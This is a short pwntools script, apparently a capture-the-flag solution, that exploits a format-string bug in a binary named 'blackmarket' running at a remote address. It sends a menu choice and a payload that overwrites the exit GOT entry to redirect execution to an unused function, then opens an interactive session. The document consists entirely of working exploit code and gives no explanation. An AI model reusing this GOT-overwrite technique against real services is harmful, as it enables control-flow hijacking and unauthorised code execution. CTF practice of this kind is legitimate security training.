from pwn import *
r = remote('103.200.7.150',5677)
#r = process('./blackmarket')
exit_got = 0x0804b038
not_used = 0x08048846
p = fmtstr64_payload(7,{exit_got:not_used})
r.sendline("6")
r.sendline(p)
r.interactive()


